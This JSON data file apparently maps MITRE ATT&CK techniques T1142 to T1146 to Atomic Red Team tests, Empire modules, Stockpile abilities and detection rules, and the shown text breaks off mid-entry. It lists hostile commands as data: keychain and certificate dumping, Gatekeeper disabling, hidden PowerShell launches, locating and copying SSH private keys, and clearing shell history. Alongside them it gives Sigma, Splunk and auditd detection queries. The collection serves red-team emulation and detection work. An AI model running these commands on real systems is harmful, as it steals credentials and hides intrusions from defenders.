"python/collection/osx/keychaindump_decrypt", "name": "Empire Module Command"}], "command_list": ["security -h\nsecurity find-certificate -a -p > allcerts.pem\nsecurity import /tmp/certs.pem -k\n", "python/collection/osx/keychaindump", "python/collection/osx/keychaindump", "python/collection/osx/keychaindump_chainbreaker", "python/collection/osx/keychaindump_chainbreaker", "python/collection/osx/keychaindump_decrypt", "python/collection/osx/keychaindump_decrypt"], "technique_id": "T1142", "parsed_datasets": [{"Atomic Red Team Test - Keychain": {"display_name": "Keychain", "atomic_tests": [{"description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n", "supported_platforms": ["macos"], "name": "Keychain", "executor": {"command": "security -h\nsecurity find-certificate -a -p > allcerts.pem\nsecurity import /tmp/certs.pem -k\n", "name": "sh"}}], "attack_technique": "T1142"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1142", "Empire Module": "python/collection/osx/keychaindump", "Technique": "Keychain", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/keychaindump\":  [\"T1142\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1142", "Empire Module": "python/collection/osx/keychaindump_chainbreaker", "Technique": "Keychain", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/keychaindump_chainbreaker\":  [\"T1142\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1142", "Empire Module": "python/collection/osx/keychaindump_decrypt", "Technique": "Keychain", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/keychaindump_decrypt\":  [\"T1142\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1143/T1143.yaml", "command": "Start-Process #{powershell_command}\n", "name": null}, {"source": "atomics/T1143/T1143.yaml", "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe\n", "name": null}], "command_list": ["Start-Process #{powershell_command}\n", "Start-Process powershell.exe -WindowStyle hidden calc.exe\n"], "technique_id": "T1143", "parsed_datasets": [{"Atomic Red Team Test - Hidden Window": {"display_name": "Hidden Window", "atomic_tests": [{"description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\n", "supported_platforms": ["windows"], "name": "Hidden Window", "input_arguments": {"powershell_process_name": {"default": "calc", "type": "string", "description": "Name of the created process"}, "powershell_command": {"default": "powershell.exe -WindowStyle hidden calc.exe", "type": "String", "description": "Command to launch calc.exe from a hidden PowerShell Window"}}, "executor": {"elevation_required": false, "command": "Start-Process #{powershell_command}\n", "name": "powershell"}}], "attack_technique": "T1143"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1144/T1144.yaml", "command": "sudo xattr -r -d com.apple.quarantine myapp.app\nsudo spctl --master-disable\n", "name": null}], "command_list": ["sudo xattr -r -d com.apple.quarantine myapp.app\nsudo spctl --master-disable\n"], "technique_id": "T1144", "parsed_datasets": [{"Atomic Red Team Test - Gatekeeper Bypass": {"display_name": "Gatekeeper Bypass", "atomic_tests": [{"description": "Gatekeeper Bypass via command line\n", "supported_platforms": ["macos"], "name": "Gatekeeper Bypass", "input_arguments": {"app_path": {"default": "myapp.app", "type": "Path", "description": "Path to app to be used"}}, "executor": {"command": "sudo xattr -r -d com.apple.quarantine #{app_path}\nsudo spctl --master-disable\n", "name": "sh"}}], "attack_technique": "T1144"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1145/T1145.yaml", "command": "echo \"ATOMICREDTEAM\" > %windir%\\cert.key\ndir c:\\ /b /s .key | findstr /e .key\n", "name": null}, {"source": "atomics/T1145/T1145.yaml", "command": "find / -name id_rsa >> /tmp/keyfile_locations.txt\nfind / -name id_dsa >> /tmp/keyfile_locations.txt\n", "name": null}, {"source": "atomics/T1145/T1145.yaml", "command": "mkdir /tmp/art-staging\nfind / -name id_rsa -exec cp --parents {} /tmp/art-staging \\;\nfind / -name id_dsa -exec cp --parents {} /tmp/art-staging \\;\n", "name": null}, {"source": "atomics/T1145/T1145.yaml", "command": "mkdir /tmp/art-staging\nfind / -name id_rsa -exec rsync -R {} /tmp/art-staging \\;\nfind / -name id_dsa -exec rsync -R {} /tmp/art-staging \\;\n", "name": null}, {"source": "data/abilities/credential-access/de632c2d-a729-4b77-b781-6a6b09c148ba.yml", "command": {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}, "name": "Find private keys on the file system"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/certs", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/certs", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/keys", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/keys", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "**Private Keys:**", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -type f \\( -name \"*.pem\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.key\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\" -o -name \"authorized*\"  \\)", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "**look for Users' SSH Private Key:** find / -name id_rsa OR find / -name id_dsa", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "**Copy Private SSH Keys with CP:** find / -name id_rsa -exec cp --parents {} #{output_folder} \\;", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -name id_dsa -exec cp --parents {} #{output_folder} \\;", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "**Copy Private SSH Keys with rsync:**", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -name id_rsa -exec rsync -R {} #{output_folder} \\;", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "find / -name id_dsa -exec rsync -R {} #{output_folder} \\;", "name": null}], "command_list": ["echo \"ATOMICREDTEAM\" > %windir%\\cert.key\ndir c:\\ /b /s .key | findstr /e .key\n", "find / -name id_rsa >> /tmp/keyfile_locations.txt\nfind / -name id_dsa >> /tmp/keyfile_locations.txt\n", "mkdir /tmp/art-staging\nfind / -name id_rsa -exec cp --parents {} /tmp/art-staging \\;\nfind / -name id_dsa -exec cp --parents {} /tmp/art-staging \\;\n", "mkdir /tmp/art-staging\nfind / -name id_rsa -exec rsync -R {} /tmp/art-staging \\;\nfind / -name id_dsa -exec rsync -R {} /tmp/art-staging \\;\n", {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}, "powershell/credentials/mimikatz/certs", "powershell/credentials/mimikatz/certs", "powershell/credentials/mimikatz/keys", "powershell/credentials/mimikatz/keys", "**Private Keys:**", "find / -type f \\( -name \"*.pem\" -o -name \"*.pgp\" -o -name \"*.gpg\" -o -name \"*.ppk\" -o -name \"*.p12\" -o -name \"*.key\" -o -name \"*.pfx\" -o -name \"*.cer\" -o -name \"*.p7b\" -o -name \"*.asc\" -o -name \"authorized*\"  \\)", "**look for Users' SSH Private Key:** find / -name id_rsa OR find / -name id_dsa", "**Copy Private SSH Keys with CP:** find / -name id_rsa -exec cp --parents {} #{output_folder} \\;", "find / -name id_dsa -exec cp --parents {} #{output_folder} \\;", "**Copy Private SSH Keys with rsync:**", "find / -name id_rsa -exec rsync -R {} #{output_folder} \\;", "find / -name id_dsa -exec rsync -R {} #{output_folder} \\;"], "technique_id": "T1145", "parsed_datasets": [{"Atomic Red Team Test - Private Keys": {"display_name": "Private Keys", "atomic_tests": [{"description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n", "supported_platforms": ["windows"], "name": "Private Keys", "executor": {"elevation_required": true, "command": "echo \"ATOMICREDTEAM\" > %windir%\\cert.key\ndir c:\\ /b /s .key | findstr /e .key\n", "name": "command_prompt", "cleanup_command": "del c:\\Windows\\cert.key >nul 2>&1\n"}}, {"description": "Discover private SSH keys on a macOS or Linux system.\n", "supported_platforms": ["macos", "linux"], "name": "Discover Private SSH Keys", "input_arguments": {"output_file": {"default": "/tmp/keyfile_locations.txt", "type": "path", "description": "Output file containing locations of SSH key files"}}, "executor": {"command": "find / -name id_rsa >> #{output_file}\nfind / -name id_dsa >> #{output_file}\n", "name": "sh"}}, {"description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n", "supported_platforms": ["linux"], "name": "Copy Private SSH Keys with CP", "input_arguments": {"output_folder": {"default": "/tmp/art-staging", "type": "path", "description": "Output folder containing copies of SSH private key files"}}, "executor": {"command": "mkdir #{output_folder}\nfind / -name id_rsa -exec cp --parents {} #{output_folder} \\;\nfind / -name id_dsa -exec cp --parents {} #{output_folder} \\;\n", "name": "sh"}}, {"description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n", "supported_platforms": ["macos", "linux"], "name": "Copy Private SSH Keys with rsync", "input_arguments": {"output_folder": {"default": "/tmp/art-staging", "type": "path", "description": "Output folder containing copies of SSH private key files"}}, "executor": {"command": "mkdir #{output_folder}\nfind / -name id_rsa -exec rsync -R {} #{output_folder} \\;\nfind / -name id_dsa -exec rsync -R {} #{output_folder} \\;\n", "name": "sh"}}], "attack_technique": "T1145"}}, {"Mitre Stockpile - Find private keys on the file system": {"platforms": {"windows": {"psh": {"command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"}, "cmd": {"command": "for %i in (\\.key \\.pgp \\.gpg \\.ppk \\.p12 \\.pem \\.pfx \\.cer \\.p7b \\.asc) do (dir c:\\ /b /s .key | findstr /e \"%i\")\n"}}, "darwin": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /Users -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;\n"}}, "linux": {"sh": {"command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;"}}}, "description": "Find private keys on the file system", "tactic": "credential-access", "technique": {"attack_id": "T1145", "name": "Private Keys"}, "id": "de632c2d-a729-4b77-b781-6a6b09c148ba", "name": "Find private keys"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1145", "Empire Module": "powershell/credentials/mimikatz/certs", "Technique": "Private Keys", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/certs\":  [\"T1145\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1145", "Empire Module": "powershell/credentials/mimikatz/keys", "Technique": "Private Keys", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/credentials/mimikatz/keys\":  [\"T1145\"],"}}], "queries": [{"query": "Yml\ntitle: the attacker to find the private key file under linux\ndescription: Ubuntu18.04\nreferences: https://github.com/12306Bro/Threathunting/blob/master/T1145-linux- private .md\ntags: T1145\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: history\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .pgp\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .pem\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .ppk\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .p12\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- sudo find / -name * .key\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "index=* sourcetype=bash_history find AND (.pem OR authorized OR gpg OR pgp OR .ppk OR .cer OR .key OR .asc)", "product": "Splunk", "name": null}, {"query": "index=* sourcetype=bash_history find AND (id_rsa OR id_dsa)", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1146/T1146.yaml", "command": "rm ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "echo \"\" > ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "cat /dev/null > ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "ln -sf /dev/null ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "truncate -s0 ~/.bash_history\n", "name": null}, {"source": "atomics/T1146/T1146.yaml", "command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "name": null}, {"source": "Threat Hunting Tables", "command": "bash unset HISTFILE", "name": null}, {"source": "Threat Hunting Tables", "command": "bash export HISTFILESIZE=0", "name": null}, {"source": "Threat Hunting Tables", "command": "bash history -c", "name": null}, {"source": "Threat Hunting Tables", "command": "bash rm ~/.bash_history", "name": null}, {"source": "Threat Hunting Tables", "command": "bash cat /dev/null > ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo \" \" > .bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat /dev/null > ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "ln -sf /dev/null ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "truncate -s0 ~/.bash_history", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "unset HISTFILE", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "export HISTFILESIZE=0", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "history -c", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["rm ~/.bash_history\n", "echo \"\" > ~/.bash_history\n", "cat /dev/null > ~/.bash_history\n", "ln -sf /dev/null ~/.bash_history\n", "truncate -s0 ~/.bash_history\n", "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "bash unset HISTFILE", "bash export HISTFILESIZE=0", "bash history -c", "bash rm ~/.bash_history", "bash cat /dev/null > ~/.bash_history", "```", "rm ~/.bash_history", "```", "```", "echo \" \" > .bash_history", "```", "```", "cat /dev/null > ~/.bash_history", "```", "```", "ln -sf /dev/null ~/.bash_history", "```", "```", "truncate -s0 ~/.bash_history", "```", "```", "unset HISTFILE", "```", "```", "export HISTFILESIZE=0", "```", "```", "history -c", "```"], "technique_id": "T1146", "parsed_datasets": [{"Atomic Red Team Test - Clear Command History": {"display_name": "Clear Command History", "atomic_tests": [{"description": "Clears bash history via rm\n", "supported_platforms": ["linux", "macos"], "name": "Clear Bash history (rm)", "executor": {"command": "rm ~/.bash_history\n", "name": "sh"}}, {"description": "Clears bash history via rm\n", "supported_platforms": ["linux", "macos"], "name": "Clear Bash history (echo)", "executor": {"command": "echo \"\" > ~/.bash_history\n", "name": "sh"}}, {"description": "Clears bash history via cat /dev/null\n", "supported_platforms": ["linux", "macos"], "name": "Clear Bash history (cat dev/null)", "executor": {"command": "cat /dev/null > ~/.bash_history\n", "name": "sh"}}, {"description": "Clears bash history via a symlink to /dev/null\n", "supported_platforms": ["linux", "macos"], "name": "Clear Bash history (ln dev/null)", "executor": {"command": "ln -sf /dev/null ~/.bash_history\n", "name": "sh"}}, {"description": "Clears bash history via truncate\n", "supported_platforms": ["linux"], "name": "Clear Bash history (truncate)", "executor": {"command": "truncate -s0 ~/.bash_history\n", "name": "sh"}}, {"description": "Clears the history of a bunch of different shell types by setting the history size to zero\n", "supported_platforms": ["linux", "macos"], "name": "Clear history of a bunch of shells", "executor": {"command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "name": "sh"}}], "attack_technique": "T1146"}}, {"Threat Hunting Tables": {"mitre_attack": "T1146", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100191", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "low", "commandline_string": "unset HISTFILE", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1146", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100192", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "low", "commandline_string": "export HISTFILESIZE=0", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1146", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100193", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "high", "commandline_string": "history -c", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1146", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100194", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "high", "commandline_string": "rm ~/.bash_history", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1146", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100195", "registry_value": "", "mitre_caption": "defense_evasion", "registry_path": "", "frequency": "high", "commandline_string": "cat /dev/null > ~/.bash_history", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_command_line contains \"*rm (Get-PSReadlineOption).HistorySavePath*\"or process_command_line contains \"*del (Get-PSReadlineOption).HistorySavePath*\"or process_command_line contains \"*Set-PSReadlineOption \u2013HistorySaveStyle SaveNothing*\"or process_command_line contains \"*Remove-Item (Get-PSReadlineOption).HistorySavePath*\")", "product": "Azure Sentinel", "name": "Clear Command History"}, {"query": "title: Clear PowerShell History\nid: dfba4ce1-e0ea-495f-986e-97140f31af2d\nstatus: experimental\ndescription: Detects keywords that could indicate clearing PowerShell history\ndate: 2019/10/25\nauthor: Ilyas Ochkov, oscd.community\nreferences:\n    - https://gist.github.com/hook-s3c/7363a856c3cdbadeb71085147f042c1a\ntags:\n    - attack.defense_evasion\n    - attack.t1146\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    keywords:\n        - 'del (Get-PSReadlineOption).HistorySavePath'\n        - 'Set-PSReadlineOption \u2013HistorySaveStyle SaveNothing'\n        - 'Remove-Item (Get-PSReadlineOption).HistorySavePath'\n        - 'rm (Get-PSReadlineOption).HistorySavePath'\n    condition: keywords\nfalsepositives:\n    - some PS-scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Clear PowerShell History\nid: dfba4ce1-e0ea-495f-986e-97140f31af2d\nstatus: experimental\ndescription: Detects keywords that could indicate clearing PowerShell history\ndate: 2019/10/25\nauthor: Ilyas Ochkov, oscd.community\nreferences:\n    - https://gist.github.com/hook-s3c/7363a856c3cdbadeb71085147f042c1a\ntags:\n    - attack.defense_evasion\n    - attack.t1146\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    keywords:\n        - 'del (Get-PSReadlineOption).HistorySavePath'\n        - 'Set-PSReadlineOption \u2013HistorySaveStyle SaveNothing'\n        - 'Remove-Item (Get-PSReadlineOption).HistorySavePath'\n        - 'rm (Get-PSReadlineOption).HistorySavePath'\n    condition: keywords\nfalsepositives:\n    - some PS-scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "\\\\*.keyword:(*del\\\\ \\\\(Get\\\\-PSReadlineOption\\\\).HistorySavePath* OR *Set\\\\-PSReadlineOption\\\\ \\xe2\\x80\\x93HistorySaveStyle\\\\ SaveNothing* OR *Remove\\\\-Item\\\\ \\\\(Get\\\\-PSReadlineOption\\\\).HistorySavePath* OR *rm\\\\ \\\\(Get\\\\-PSReadlineOption\\\\).HistorySavePath*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Clear-PowerShell-History <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Clear PowerShell History\",\\n    \"description\": \"Detects keywords that could indicate clearing PowerShell history\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1146\"\\n    ],\\n    \"query\": \"\\\\\\\\*.keyword:(*del\\\\\\\\ \\\\\\\\(Get\\\\\\\\-PSReadlineOption\\\\\\\\).HistorySavePath* OR *Set\\\\\\\\-PSReadlineOption\\\\\\\\ \\\\u2013HistorySaveStyle\\\\\\\\ SaveNothing* OR *Remove\\\\\\\\-Item\\\\\\\\ \\\\\\\\(Get\\\\\\\\-PSReadlineOption\\\\\\\\).HistorySavePath* OR *rm\\\\\\\\ \\\\\\\\(Get\\\\\\\\-PSReadlineOption\\\\\\\\).HistorySavePath*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"\\\\\\\\*.keyword:(*del\\\\\\\\ \\\\\\\\(Get\\\\\\\\-PSReadlineOption\\\\\\\\).HistorySavePath* OR *Set\\\\\\\\-PSReadlineOption\\\\\\\\ \\\\u2013HistorySaveStyle\\\\\\\\ SaveNothing* OR *Remove\\\\\\\\-Item\\\\\\\\ \\\\\\\\(Get\\\\\\\\-PSReadlineOption\\\\\\\\).HistorySavePath* OR *rm\\\\\\\\ \\\\\\\\(Get\\\\\\\\-PSReadlineOption\\\\\\\\).HistorySavePath*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Clear PowerShell History\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "\\\\*.keyword:(*del \\\\(Get\\\\-PSReadlineOption\\\\).HistorySavePath* OR *Set\\\\-PSReadlineOption \\xe2\\x80\\x93HistorySaveStyle SaveNothing* OR *Remove\\\\-Item \\\\(Get\\\\-PSReadlineOption\\\\).HistorySavePath* OR *rm \\\\(Get\\\\-PSReadlineOption\\\\).HistorySavePath*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(\"del (Get-PSReadlineOption).HistorySavePath\" OR \"Set-PSReadlineOption \\xe2\\x80\\x93HistorySaveStyle SaveNothing\" OR \"Remove-Item (Get-PSReadlineOption).HistorySavePath\" OR \"rm (Get-PSReadlineOption).HistorySavePath\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(\"del (Get-PSReadlineOption).HistorySavePath\" OR \"Set-PSReadlineOption \\xe2\\x80\\x93HistorySaveStyle SaveNothing\" OR \"Remove-Item (Get-PSReadlineOption).HistorySavePath\" OR \"rm (Get-PSReadlineOption).HistorySavePath\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*del \\\\(Get-PSReadlineOption\\\\)\\\\.HistorySavePath|.*Set-PSReadlineOption \\xe2\\x80\\x93HistorySaveStyle SaveNothing|.*Remove-Item \\\\(Get-PSReadlineOption\\\\)\\\\.HistorySavePath|.*rm \\\\(Get-PSReadlineOption\\\\)\\\\.HistorySavePath))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=263 | table time,host,auid,uid,euid,exe,key", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit type=PATH name=.bash_history nametype=delete | table time,name,nametype", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 a2!=0 AND a3!=0 | table host,syscall,syscall_name,exe,auid", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "a2!=0 and a3!=0 are added in to the query to distinuish echo and cat - both logs Systemcall 257 (openat). Morover, when a user logsin through ssh - SYSCALL 257 is used with exe=/usr/bin/bash (2 events generated)for /home/$USER/.bash_history; however in that case the command arguments a2=0 and a3=0 ; when we use command \"echo \" \"> .bash_history\"  the same systemcall (257) and the same exe = /usr/bin/bash is used however command arguments a2!=0 and a3!=0.", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 exe=/usr/bin/bash a2!=0 AND a3!=0| table host,syscall,syscall_name,exe,auid", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "-a always,exit -F arch=b64 -F PATH=/home/ec2-user/.bash_history -S unlinkat -F auid>=1000 -F auid!=4294967295 -F key=delete_bash_history", "product": "Splunk", "name": null}, {"query": "-w /home/ec2-user/.bash_history -p rwa -k bash_history_changes", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\"  \"rm * .bash_history\"", "product": "Splunk", "name": null}, {"query": 